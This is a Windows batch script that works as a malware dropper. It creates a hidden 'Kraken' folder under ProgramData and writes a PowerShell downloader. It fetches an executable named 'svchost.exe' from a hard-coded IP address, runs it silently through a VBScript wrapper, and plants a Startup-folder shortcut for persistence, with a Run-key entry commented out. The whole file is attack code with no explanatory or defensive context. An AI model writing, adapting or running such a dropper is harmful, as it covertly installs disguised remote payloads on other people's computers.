@echo off
cd %programdata%
MD Windows
MD Kraken
attrib Kraken +s +h
cd Kraken
echo param($url, $filename);$client = new-object System.Net.WebClient;$client.DownloadFile( $url, $filename) > dwnd.ps1
echo powershell -ExecutionPolicy RemoteSigned -File "dwnd.ps1" "http://192.168.111.106/download/svchost.exe" "C:\ProgramData\Windows\svchost.exe" > 1.bat
echo powershell -ExecutionPolicy RemoteSigned -File "dwnd.ps1" "http://192.168.111.106/download/svchost.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.lnk" >> 1.bat
echo start C:\ProgramData\Windows\svchost.exe >> 1.bat
echo exit >> 1.bat
echo Dim oShell > 2.vbs
echo Set oShell = WScript.CreateObject ("WSCript.shell") >> 2.vbs
echo oShell.run "cmd /C 1.bat",0 >> 2.vbs
echo Set oShell = Nothing >> 2.vbs
start /min 2.vbs
ping localhost -n 2 > nul
REM reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v svchost /t reg_sz /d "%programdata%\Windows\svchost.exe -silent" /f
start svchost.exe
exit